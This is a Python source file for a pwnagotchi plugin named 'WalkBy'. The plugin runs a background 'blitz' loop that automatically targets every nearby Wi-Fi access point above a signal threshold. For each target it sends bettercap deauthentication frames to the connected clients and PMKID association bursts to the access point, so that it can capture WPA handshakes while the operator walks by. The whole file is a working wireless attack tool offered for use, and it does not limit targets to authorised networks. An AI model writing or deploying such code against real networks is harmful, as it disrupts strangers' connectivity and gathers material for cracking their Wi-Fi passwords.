"""
Walk-By Attack Plugin - Rapid drive-by handshake capture.

Instead of the default scan-then-attack cycle, this plugin fires deauths
and association frames the INSTANT an AP is seen during recon. Scanning
and attacking happen concurrently so you never stop walking.

Enable/disable from the web UI (webcfg) or via config:

    [main.plugins.walkby]
    enabled = true
    min_rssi = -75          # ignore weak APs (too far to capture)
    deauth_per_client = 3   # burst deauth count per client
    assoc_per_ap = 2        # PMKID association attempts per AP
    cooldown = 30           # seconds before re-attacking same target
    channel_hop_secs = 1.5  # seconds per channel in blitz mode
    blitz_channels = []     # empty = all, or [1,6,11] for speed
    show_status = true      # show walkby status on display
    status_position = [0, 82]
"""
import logging
import time
import threading

import pwnagotchi.plugins as plugins
import pwnagotchi.ui.fonts as fonts
from pwnagotchi.ui.components import Text
from pwnagotchi.ui.view import BLACK


class WalkBy(plugins.Plugin):
    __author__ = 'pwnagotchi'
    __version__ = '1.1.0'
    __license__ = 'GPL3'
    __description__ = 'Walk-by blitz attack - spray deauths while walking, never stop'

    MAX_QUEUED_TARGETS = 200  # cap pending queue to prevent memory growth

    def __init__(self):
        self.options = dict()
        self._attack_history = {}       # {mac: last_attack_timestamp}
        self._captures = 0              # handshakes caught while blitz active
        self._attacks_sent = 0
        self._aps_seen = 0
        self._active = False
        self._blitz_thread = None
        self._agent = None
        self._lock = threading.Lock()
        self._pending_targets = []      # [(ap, clients)] queue
        self._target_lock = threading.Lock()
        self._stop_event = threading.Event()
        self._whitelist_cache = None    # cached normalized whitelist
        self._whitelist_raw = None      # raw whitelist for cache invalidation

    def on_loaded(self):
        logging.info("[walkby] plugin loaded")

    def on_ready(self, agent):
        self._agent = agent
        if self.options.get('enabled', True):
            self._start_blitz()

    def on_unload(self, ui):
        self._stop_blitz()
        with ui._lock:
            try:
                ui.remove_element('walkby_status')
            except Exception:
                pass

    def on_ui_setup(self, ui):
        if not self.options.get('show_status', True):
            return
        pos = self.options.get('status_position', [0, 82])
        if isinstance(pos, str):
            pos = [int(x.strip()) for x in pos.split(',')]
        ui.add_element('walkby_status', Text(
            color=BLACK,
            value='',
            position=(pos[0], pos[1]),
            font=fonts.Small,
        ))

    def on_ui_update(self, ui):
        if not self.options.get('show_status', True):
            return
        if self._active:
            ui.set('walkby_status',
                   f'BLITZ {self._attacks_sent}atk {self._captures}cap')
        else:
            ui.set('walkby_status', '')

    def on_config_changed(self, config):
        """Handle enable/disable from webcfg."""
        try:
            enabled = config['main']['plugins']['walkby'].get('enabled', False)
            if enabled and not self._active:
                self._start_blitz()
            elif not enabled and self._active:
                self._stop_blitz()
        except (KeyError, TypeError):
            pass

    def _get_whitelist(self, agent):
        """Return cached normalized whitelist sets. Rebuilds only when config changes."""
        raw = agent._config['main']['whitelist']
        if raw is not self._whitelist_raw:
            self._whitelist_raw = raw
            names = set()
            macs = set()
            prefixes = set()
            for w in raw:
                wl = w.lower()
                if ':' in w:
                    if len(w) <= 13:
                        prefixes.add(wl)
                    else:
                        macs.add(wl)
                else:
                    names.add(w)
            self._whitelist_cache = (names, macs, prefixes)
        return self._whitelist_cache

    def on_wifi_update(self, agent, access_points):
        """Called when filtered AP list is refreshed - queue targets immediately."""
        if not self._active:
            return

        self._aps_seen = len(access_points)
        wl_names, wl_macs, wl_prefixes = self._get_whitelist(agent)
        min_rssi = self.options.get('min_rssi', -75)
        cooldown = self.options.get('cooldown', 30)
        now = time.time()

        targets = []
        for ap in access_points:
            mac = ap['mac'].lower()

            # Skip weak signals - too far to capture
            if ap.get('rssi', -200) < min_rssi:
                continue

            # Skip whitelisted (cached sets — O(1) lookups)
            if (ap['hostname'] in wl_names or
                    mac in wl_macs or
                    mac[:13] in wl_prefixes):
                continue

            # Skip recently attacked
            last = self._attack_history.get(mac, 0)
            if now - last < cooldown:
                continue

            targets.append((ap, ap.get('clients', [])))

        if targets:
            with self._target_lock:
                # Cap queue size — drop oldest if full
                space = self.MAX_QUEUED_TARGETS - len(self._pending_targets)
                if space <= 0:
                    self._pending_targets = self._pending_targets[-self.MAX_QUEUED_TARGETS // 2:]
                self._pending_targets.extend(targets)

    def on_channel_hop(self, agent, channel):
        """Also fire on channel hop - attack anything visible on this channel."""
        pass  # on_wifi_update handles it; channel hop triggers AP refresh

    def on_handshake(self, agent, filename, access_point, client_station):
        """Track captures during blitz."""
        if self._active:
            with self._lock:
                self._captures += 1

    def on_epoch(self, agent, epoch, epoch_data):
        """Keep agent reference fresh."""
        self._agent = agent

    def on_webhook(self, path, request):
        """API endpoints for walk-by plugin."""
        from flask import jsonify

        if request.method == 'GET':
            if path == '/' or path == '' or path == 'status':
                return jsonify({
                    'active': self._active,
                    'attacks_sent': self._attacks_sent,
                    'captures': self._captures,
                    'aps_seen': self._aps_seen,
                    'targets_queued': len(self._pending_targets),
                    'history_size': len(self._attack_history),
                })

        if request.method == 'POST':
            if path == 'start':
                self._start_blitz()
                return jsonify({'ok': True, 'active': True})
            elif path == 'stop':
                self._stop_blitz()
                return jsonify({'ok': True, 'active': False})
            elif path == 'reset':
                self._attack_history.clear()
                self._attacks_sent = 0
                self._captures = 0
                return jsonify({'ok': True, 'reset': True})

        return jsonify({'error': 'unknown endpoint'})

    # === Blitz engine ===

    def _start_blitz(self):
        if self._active:
            return
        self._active = True
        self._stop_event.clear()
        self._blitz_thread = threading.Thread(
            target=self._blitz_loop, daemon=True, name="WalkByBlitz")
        self._blitz_thread.start()
        logging.info("[walkby] BLITZ MODE ACTIVE")

    def _stop_blitz(self):
        if not self._active:
            return
        self._active = False
        self._stop_event.set()
        if self._blitz_thread:
            self._blitz_thread.join(timeout=5)
        logging.info("[walkby] blitz stopped")

    def _blitz_loop(self):
        """
        Main blitz thread: continuously drain the target queue and fire attacks.
        Runs in parallel with pwnagotchi's normal recon loop.
        """
        deauth_count = self.options.get('deauth_per_client', 3)
        assoc_count = self.options.get('assoc_per_ap', 2)
        consecutive_errors = 0

        while not self._stop_event.is_set():
            # Grab all pending targets
            with self._target_lock:
                targets = list(self._pending_targets)
                self._pending_targets.clear()

            if not targets:
                self._stop_event.wait(0.2)
                continue

            agent = self._agent
            if agent is None:
                self._stop_event.wait(1)
                continue

            for ap, clients in targets:
                if self._stop_event.is_set():
                    break

                mac = ap['mac'].lower()
                now = time.time()

                # Mark as attacked
                self._attack_history[mac] = now

                # Send PMKID association burst
                for _ in range(assoc_count):
                    if self._stop_event.is_set():
                        break
                    try:
                        agent.run('wifi.assoc %s' % ap['mac'])
                        with self._lock:
                            self._attacks_sent += 1
                        consecutive_errors = 0
                    except Exception as e:
                        if 'unknown BSSID' in str(e):
                            break  # AP gone, skip
                        consecutive_errors += 1
                        if consecutive_errors >= 10:
                            logging.warning("[walkby] bettercap unreachable, backing off 10s")
                            self._stop_event.wait(10)
                            consecutive_errors = 0
                            break
                        logging.debug("[walkby] assoc error: %s", e)

                # Deauth each client
                for sta in clients:
                    if self._stop_event.is_set():
                        break
                    for _ in range(deauth_count):
                        if self._stop_event.is_set():
                            break
                        try:
                            agent.run('wifi.deauth %s' % sta['mac'])
                            with self._lock:
                                self._attacks_sent += 1
                            consecutive_errors = 0
                        except Exception as e:
                            if 'unknown BSSID' in str(e):
                                break
                            consecutive_errors += 1
                            if consecutive_errors >= 10:
                                logging.warning("[walkby] bettercap unreachable, backing off 10s")
                                self._stop_event.wait(10)
                                consecutive_errors = 0
                                break
                            logging.debug("[walkby] deauth error: %s", e)

                # Tiny pause between APs to not flood bettercap API
                self._stop_event.wait(0.05)

            # Clean old history entries (> 5 min)
            cutoff = time.time() - 300
            self._attack_history = {
                k: v for k, v in self._attack_history.items() if v > cutoff
            }
